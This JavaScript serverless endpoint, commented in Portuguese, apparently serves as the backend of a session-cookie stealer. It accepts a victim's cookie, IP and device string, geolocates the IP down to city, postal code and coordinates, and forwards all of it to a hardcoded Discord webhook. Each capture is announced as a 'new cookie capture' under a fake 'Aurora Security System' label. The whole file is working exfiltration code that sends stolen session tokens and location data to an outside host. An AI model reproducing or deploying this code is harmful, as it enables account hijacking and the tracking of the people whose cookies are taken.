export default async function handler(req, res) {
  // Permitir CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Responder preflight requests
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Apenas POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { cookie, ip, device } = req.body;

    // Validar dados
    if (!cookie || cookie.length < 50) {
      return res.status(400).json({ error: 'Cookie inválido' });
    }

    // Buscar informações detalhadas do IP
    let ipInfo = {};
    try {
      const ipResponse = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
      ipInfo = await ipResponse.json();
    } catch (e) {
      console.error('Erro ao buscar info do IP:', e);
    }

    // WEBHOOK DO DISCORD
    const webhookURL = 'https://canary.discord.com/api/webhooks/1485346055141851308/-4ro_V3pWvgd_qRDW6uOO0WkVEmDQmt-9HNzgFd1MnqObF-TGy23rXLxESosIqg8KnFT';

    // ===== FUNÇÃO PARA DIVIDIR COOKIE GRANDE =====
    function dividirCookie(texto, limite = 1900) {
      if (texto.length <= limite) return [texto];
      
      const partes = [];
      let resto = texto;
      
      while (resto.length > limite) {
        let corte = resto.lastIndexOf(':', limite);
        if (corte === -1) corte = resto.lastIndexOf('-', limite);
        if (corte === -1) corte = resto.lastIndexOf('=', limite);
        if (corte === -1) corte = limite;
        
        partes.push(resto.substring(0, corte));
        resto = resto.substring(corte);
      }
      partes.push(resto);
      
      return partes;
    }

    const partesCookie = dividirCookie(cookie);
    
    // ===== INFORMAÇÕES DO DISPOSITIVO =====
    const dispositivoInfo = `\`\`\`yml
Dispositivo: ${device}
Navegador: ${getBrowserInfo(req)}
Sistema: ${getOSInfo(req)}
Idioma: ${req.headers['accept-language'] || 'Desconhecido'}
\`\`\``;

    // ===== INFORMAÇÕES DO IP =====
    const ipInfoText = `\`\`\`yml
IP: ${ip}
País: ${ipInfo.country || 'Desconhecido'} ${ipInfo.countryCode || ''}
Região: ${ipInfo.regionName || 'Desconhecido'}
Cidade: ${ipInfo.city || 'Desconhecido'}
CEP: ${ipInfo.zip || 'Desconhecido'}
Latitude: ${ipInfo.lat || 'Desconhecido'}
Longitude: ${ipInfo.lon || 'Desconhecido'}
Fuso Horário: ${ipInfo.timezone || 'Desconhecido'}
Provedor: ${ipInfo.isp || 'Desconhecido'}
Organização: ${ipInfo.org || 'Desconhecido'}
Mobile: ${ipInfo.mobile ? 'Sim' : 'Não'}
Proxy/VPN: ${ipInfo.proxy ? 'Sim' : 'Não'}
Hosting: ${ipInfo.hosting ? 'Sim' : 'Não'}
\`\`\``;

    // ===== CONSTRUIR EMBEDS =====
    const embeds = [];
    
    // Primeiro embed com as primeiras partes do cookie
    for (let i = 0; i < partesCookie.length; i++) {
      const fields = [];
      
      // Primeira parte do cookie
      if (i === 0) {
        fields.push({
          name: '🍪 COOKIE COMPLETO',
          value: '```' + partesCookie[i] + '```'
        });
        fields.push({
          name: '📊 INFORMAÇÕES DO DISPOSITIVO',
          value: dispositivoInfo
        });
        fields.push({
          name: '🌍 INFORMAÇÕES DO IP',
          value: ipInfoText
        });
        fields.push({
          name: '⏰ TIMESTAMP',
          value: `<t:${Math.floor(Date.now() / 1000)}:F> (<t:${Math.floor(Date.now() / 1000)}:R>)`,
          inline: true
        });
        fields.push({
          name: '🔢 ID DA SESSÃO',
          value: `\`${generateSessionId()}\``,
          inline: true
        });
        fields.push({
          name: '📏 TAMANHO DO COOKIE',
          value: `\`${cookie.length} caracteres (${partesCookie.length} parte(s))\``,
          inline: true
        });
      } else {
        // Partes seguintes do cookie
        fields.push({
          name: `📦 CONTINUAÇÃO DO COOKIE (Parte ${i+1}/${partesCookie.length})`,
          value: '```' + partesCookie[i] + '```'
        });
      }
      
      embeds.push({
        title: i === 0 ? '🔐 NOVA CAPTURA DE COOKIE' : `📎 CONTINUAÇÃO (${i+1}/${partesCookie.length})`,
        description: i === 0 ? 'Um novo cookie foi capturado pelo sistema Aurora' : null,
        color: 0x6366f1,
        fields: fields,
        footer: {
          text: 'Aurora Security System • Proteção Avançada',
          icon_url: 'https://media.discordapp.net/attachments/1478076459074719877/1478567053999869993/Gemini_Generated_Image_17qz9117qz9117qz.png'
        },
        timestamp: new Date().toISOString(),
        thumbnail: {
          url: 'https://media.discordapp.net/attachments/1456825082507956428/1477117859665805312/clideo_editor_64f89f8646e04ff7b36cd451bf005602_online-video-cutter.com.gif'
        }
      });
    }

    // ===== ENVIAR PARA O DISCORD =====
    for (let i = 0; i < embeds.length; i++) {
      const payload = {
        content: i === 0 ? '@everyone' : null,
        embeds: [embeds[i]]
      };
      
      const response = await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      
      if (!response.ok) {
        console.error(`Erro ao enviar embed ${i + 1}:`, await response.text());
        throw new Error(`Falha ao enviar parte ${i + 1}`);
      }
      
      // Delay entre envios
      if (embeds.length > 1 && i < embeds.length - 1) {
        await new Promise(r => setTimeout(r, 800));
      }
    }

    return res.status(200).json({ success: true, message: `Cookie enviado (${partesCookie.length} parte(s))` });

  } catch (error) {
    console.error('Erro:', error);
    return res.status(500).json({ error: 'Erro interno: ' + error.message });
  }
}

// ===== FUNÇÕES AUXILIARES =====

function getBrowserInfo(req) {
  const ua = req.headers['user-agent'] || '';
  if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Google Chrome';
  if (ua.includes('Firefox')) return 'Mozilla Firefox';
  if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Apple Safari';
  if (ua.includes('Edg')) return 'Microsoft Edge';
  if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
  return 'Desconhecido';
}

function getOSInfo(req) {
  const ua = req.headers['user-agent'] || '';
  if (ua.includes('Windows')) return 'Windows';
  if (ua.includes('Mac OS')) return 'macOS';
  if (ua.includes('Linux')) return 'Linux';
  if (ua.includes('Android')) return 'Android';
  if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
  return 'Desconhecido';
}

function generateSessionId() {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
}
